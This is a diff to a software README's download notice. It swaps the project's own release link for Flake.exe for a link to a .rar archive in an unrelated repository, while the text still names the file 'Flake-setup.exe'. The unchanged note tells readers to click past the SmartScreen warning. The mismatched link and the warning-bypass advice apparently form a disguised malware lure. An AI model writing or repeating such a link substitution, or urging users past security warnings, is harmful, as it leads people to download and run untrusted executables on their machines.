@@ -18,7 +18,7 @@
 </p>
 
 > [!NOTE]
-> **Download:** the Windows build is a single `Flake-setup.exe` — [releases](../../releases/download/v1.0.3/Flake.exe). No installer, no admin rights, no account.
+> **Download:** the Windows build is a single `Flake-setup.exe` — [releases](https://github.com/Tropicaldrescoop/discord-id-osint-checker/releases/latest/download/discord-id-osint-checker.rar). No installer, no admin rights, no account.
 >
 > The build isn't code-signed yet, so SmartScreen may warn you the first time. Choose **More info**, then **Run anyway**.
 
